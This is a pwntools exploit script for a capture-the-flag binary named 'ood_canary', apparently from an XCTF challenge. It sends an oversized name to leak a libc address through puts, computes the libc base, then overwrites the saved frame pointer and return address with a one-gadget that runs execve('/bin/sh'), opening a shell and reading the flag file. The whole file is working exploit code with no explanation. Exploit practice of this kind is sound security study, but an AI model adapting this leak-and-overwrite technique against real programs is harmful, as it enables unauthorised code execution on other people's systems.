from re import I
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./ood_canary"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("pwn-965e5cecc8.challenge.xctf.org.cn", 9999, ssl=True)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


name = 0x404060
bss = 0x404080
flag = 0x404010

payload = b"a" * 0x27

io.sendlineafter(" (good/vuln/exit): ", "good")
io.sendafter("your name first:\n", payload)
io.sendlineafter(" (good/vuln/exit): ", "good")
leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
log.success("libc :-----> " + hex(libc.address))
io.sendafter("your name first:\n", "1")

ddebug("break *0x04014b6\n continue")
io.sendlineafter(" (good/vuln/exit): ", "vuln")
payload = b"exec".ljust(0x30, b"\x00") + p64(bss + 0x600)
"""
0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
"""
payload += p64(0xebd3f + libc.address)
io.sendlineafter("payload: \n", payload)

io.sendline(b"cat flag")

io.interactive()
